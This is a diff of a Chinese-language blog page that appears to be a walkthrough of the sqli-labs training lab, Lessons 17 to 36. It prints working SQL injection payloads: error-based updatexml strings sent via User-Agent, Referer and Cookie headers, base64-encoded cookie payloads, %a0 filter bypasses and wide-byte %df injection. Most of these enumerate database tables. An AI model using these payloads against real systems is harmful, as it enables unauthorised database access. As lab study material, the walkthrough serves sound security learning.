@@ -100,7 +100,7 @@
                 <div class="py-5 z-depth-3 board">
                     <div class="post-content mx-auto">
                         <div class="markdown-body">
-                            <h1 id="Easy-Challenges"><a href="#Easy-Challenges" class="headerlink" title="Easy Challenges"></a>Easy Challenges</h1><h2 id="Lesson-17"><a href="#Lesson-17" class="headerlink" title="Lesson 17"></a>Lesson 17</h2><p>首先有一个 PHP 的 check_input 的过滤机制：</p>
+                            <h1 id="Basic-Challenges"><a href="#Basic-Challenges" class="headerlink" title="Basic Challenges"></a>Basic Challenges</h1><h2 id="Lesson-17"><a href="#Lesson-17" class="headerlink" title="Lesson 17"></a>Lesson 17</h2><p>首先有一个 PHP 的 check_input 的过滤机制：</p>
 <pre><code>function check_input($value)
     {
     if(!empty($value))
@@ -150,13 +150,13 @@ for i_payload in payload:
     main_payload = {&quot;uname&quot;:&quot;admin&quot;, &quot;passwd&quot;:&quot;admin\&#39; and updatexml(1,concat(0x7e,(&quot; + i_payload + &quot;),0x7e),1)#&quot;}
     response = requests.post(url=main_url, data=main_payload)
     print response.content
-</code></pre><h2 id="Lesson-18-Useragent-注入"><a href="#Lesson-18-Useragent-注入" class="headerlink" title="Lesson 18 Useragent 注入"></a>Lesson 18 Useragent 注入</h2><p>uname 和 passwd 无法注入。发现 user agent 注入点，进行报错注入，uname 和 passwd 要确保能够有查询结果，payload:</p>
+</code></pre><h2 id="Lesson-18-User-agent-注入"><a href="#Lesson-18-User-agent-注入" class="headerlink" title="Lesson 18 User agent 注入"></a>Lesson 18 User agent 注入</h2><p>uname 和 passwd 无法注入。发现 user agent 注入点，进行报错注入，uname 和 passwd 要确保能够有查询结果，payload:</p>
 <pre><code>&#39; and updatexml(1,concat(0x7e,database(),0x7e),1) and &#39;1&#39;=&#39;1</code></pre><p>如图所示：<br><img src="/images/Sqli_Lab_Learning/user_agent_sql.png" alt></p>
 <h2 id="Lesson-19-Referer-注入"><a href="#Lesson-19-Referer-注入" class="headerlink" title="Lesson 19 Referer 注入"></a>Lesson 19 Referer 注入</h2><p>同样地，uname 和 passwd 无法注入。存在 Referer 注入点，进行报错注入，uname 和 passwd 要确保有查询结果，payload:</p>
 <pre><code>&#39; and updatexml(1,concat(0x7e, (select database()),0x7e),1) and &#39;1&#39; = &#39;1</code></pre><p>如图所示：<br><img src="/images/Sqli_Lab_Learning/user_agent_sql.png" alt></p>
 <h2 id="Lesson-20-Cookie-注入"><a href="#Lesson-20-Cookie-注入" class="headerlink" title="Lesson 20 Cookie 注入"></a>Lesson 20 Cookie 注入</h2><p>uname 和 passwd 无法注入。存在 Cookie 注入点，进行报错注入，payload:</p>
 <pre><code>uname=admin&#39; and updatexml(1,concat(0x7e,(select database()),0x7e),1)#</code></pre><p>如图所示：<br><img src="/images/Sqli_Lab_Learning/Cookie_sql.png" alt></p>
-<h2 id="Lesson-21"><a href="#Lesson-21" class="headerlink" title="Lesson 21"></a>Lesson 21</h2><p>Cookie 注入，万变不离其宗，报错注入加上 base64，’)闭合，payload 如下：</p>
+<h1 id="Advanced-Injections"><a href="#Advanced-Injections" class="headerlink" title="Advanced Injections"></a>Advanced Injections</h1><h2 id="Lesson-21"><a href="#Lesson-21" class="headerlink" title="Lesson 21"></a>Lesson 21</h2><p>Cookie 注入，万变不离其宗，报错注入加上 base64，’)闭合，payload 如下：</p>
 <pre><code>uname=JykgYW5kIHVwZGF0ZXhtbCgxLGNvbmNhdCgweDdlLChzZWxlY3QgZGF0YWJhc2UoKSksMHg3ZSksMSkgYW5kICgnMScpPSgnMQ==</code></pre><p>如图所示：<br><img src="/images/Sqli_Lab_Learning/Lesson_21_1.png" alt></p>
 <h2 id="Lesson-22"><a href="#Lesson-22" class="headerlink" title="Lesson 22"></a>Lesson 22</h2><p>Cookie 注入，报错注入加上 base64，双引号闭合，payload 如下：</p>
 <pre><code>uname=IiBhbmQgdXBkYXRleG1sKDEsY29uY2F0KDB4N2UsKHNlbGVjdCBkYXRhYmFzZSgpKSwweDdlKSwxKSBhbmQgIjEiID0iMQ==</code></pre><p>如图所示：<br><img src="/images/Sqli_Lab_Learning/Lesson_22_1.png" alt></p>
@@ -254,7 +254,27 @@ return $id;
 }
 </code></pre><p>“ 闭合，无 print_r(mysql_error()); 所以使用普通的联合注入。<br>payload:</p>
 <pre><code>?id=&quot;unIon%a0sELEct%a01,(sELEct%a0group_concat(table_name)%a0from%a0information_schema.tables%a0where%a0table_schema=database()),3||&quot;</code></pre><p>这里可以使用之前的三次写 select，两次写 union 的方法，也可以大小写绕过。</p>
-<h2 id="Lesson-28"><a href="#Lesson-28" class="headerlink" title="Lesson 28"></a>Lesson 28</h2>
+<h2 id="Lesson-28"><a href="#Lesson-28" class="headerlink" title="Lesson 28"></a>Lesson 28</h2><p>FUZZ 了 /，*，-，#，空格，union select。使用普通的联合注入，’) 闭合。<br>依然可以利用 %a0 绕过空格过滤，同时绕过 “union select” 的过滤。<br>payload:</p>
+<pre><code>?id=&#39;)union%a0select%a01,(select%a0group_concat(table_name)%a0from%a0information_schema.tables%a0where%a0table_schema=database()),2||(&#39;</code></pre><h2 id="Lesson-28a"><a href="#Lesson-28a" class="headerlink" title="Lesson 28a"></a>Lesson 28a</h2><p>上一题 FUZZ 缩减版。<br>payload 和上一题一样。</p>
+<h2 id="Lesson-29"><a href="#Lesson-29" class="headerlink" title="Lesson 29"></a>Lesson 29</h2><p>无 FUZZ。<br>单引号闭合，普通的联合查询注入。<br>payload:</p>
+<pre><code>?id=-1&#39; union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema=database()) %23</code></pre><h2 id="Lesson-30"><a href="#Lesson-30" class="headerlink" title="Lesson 30"></a>Lesson 30</h2><p>无 FUZZ。<br>双引号闭合，普通的联合查询注入。<br>payload:</p>
+<pre><code>?id=-1&quot; union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema=database()) %23</code></pre><h2 id="Lesson-31"><a href="#Lesson-31" class="headerlink" title="Lesson 31"></a>Lesson 31</h2><p>无 FUZZ。<br>“)，普通的联合查询注入。<br>payload:</p>
+<pre><code>?id=-1&quot;) union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema=database()) %23</code></pre><h2 id="Lesson-32-宽字节注入"><a href="#Lesson-32-宽字节注入" class="headerlink" title="Lesson 32 宽字节注入"></a>Lesson 32 宽字节注入</h2><p>原理：</p>
+<pre><code>宽字节注入是利用 mysql 的一个特性，mysql 在使用 GB K编码的时候（标志性的是 mysql_query(&quot;SET NAMES gbk&quot;); 语句），会认为两个字符是一个汉字（前一个ASCII码要大于128，才到汉字的范围）。可以利用这个特性，在一些特殊字符前加上一个 ASCII 码大于 128 的字符，像反斜杠，从而两个字符一并转化为一个汉字。</code></pre><p>这里我们需要屏蔽反斜杠，于是 payload:</p>
+<pre><code>?id=-1%df&#39;union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=database()),3 %23</code></pre><p>这题留下一个问题：</p>
+<pre><code>&lt;?php
+$string = &#39;\\\\&#39;;
+echo $string .&quot;&lt;br&gt;&quot;;
+echo  preg_quote(&#39;\\&#39;).&quot;&lt;br&gt;&quot;;
+echo &quot;\\\\\\&quot; .&quot;&lt;br&gt;&quot;;
+$string = preg_replace(&#39;/&#39;. preg_quote(&#39;\\&#39;) .&#39;/&#39;, &quot;\\\\&quot;, $string);
+echo $string;</code></pre><p>escape 转义反斜杠为什么需要 “\\\“ 六个反斜杠？</p>
+<h2 id="Lesson-33"><a href="#Lesson-33" class="headerlink" title="Lesson 33"></a>Lesson 33</h2><p>与上题不同的是过滤变为 addslashes 函数。在手册查看 addslashes 函数。<br><img src="/images/Sqli_Lab_Learning/addslashes.png" alt></p>
+<p>采用和上一题相同的注入方式，<br>payload:</p>
+<pre><code>?id=-1%df&#39;union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=database()),3 --+</code></pre><h2 id="Lesson-34"><a href="#Lesson-34" class="headerlink" title="Lesson 34"></a>Lesson 34</h2><p>单引号闭合，联合查询注入。<br>同样是宽字节注入，但是 POST 传值和 GET 传值有一些不同。GET 传值会在后台会自动经过一次 URL 解码，但是 POST 不会有这个解码步骤。所以对于 POST 传值，我们直接使用 %df 对应的字符 �。<br>payload:</p>
+<pre><code>uname=0�&#39; union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()%23&amp;passwd=1</code></pre><p><strong>宽字节注入真正起作用的是对应的注入宽字节字符，不是其字符编码。</strong></p>
+<h2 id="Lesson-35"><a href="#Lesson-35" class="headerlink" title="Lesson 35"></a>Lesson 35</h2><p>普通的联合查询注入，addslashes 对无闭合查询没有影响。<br>payload:</p>
+<pre><code>?id=-1 union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=database()) ,3 %23</code></pre><h2 id="Lesson-36"><a href="#Lesson-36" class="headerlink" title="Lesson 36"></a>Lesson 36</h2>
                             <hr>
                         </div>
                         <br>
@@ -262,6 +282,8 @@ return $id;
                             
                             <p>
                                 <i class="iconfont icon-tag"></i>
+                                
+                                    <a class="hover-with-bg" href="/tags/SQL">SQL</a>
                                 
                             </p>
                             
